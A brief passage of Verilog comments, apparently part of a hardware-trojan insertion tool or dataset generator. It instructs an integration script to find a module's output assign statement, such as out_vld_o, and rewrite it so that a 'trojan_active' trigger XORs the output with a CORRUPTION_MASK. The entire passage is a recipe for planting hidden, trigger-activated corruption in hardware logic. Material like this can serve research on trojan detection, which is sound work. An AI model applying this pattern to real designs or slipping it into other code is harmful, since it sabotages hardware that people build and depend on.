...
//
// IMPORTANT: out_vld_o may be an INPUT port.
//   Input ports have NO assign statement inside the module.
//   If out_vld_o is an input, target the first OUTPUT assign instead.
//
// Integration Script Must:
//   Find the output assign for out_vld_o (or first output assign):
//     assign out_vld_o = <expr>;
//   Replace with:
//     assign out_vld_o = trojan_active ? (<expr> ^ CORRUPTION_MASK) : <expr>;
//
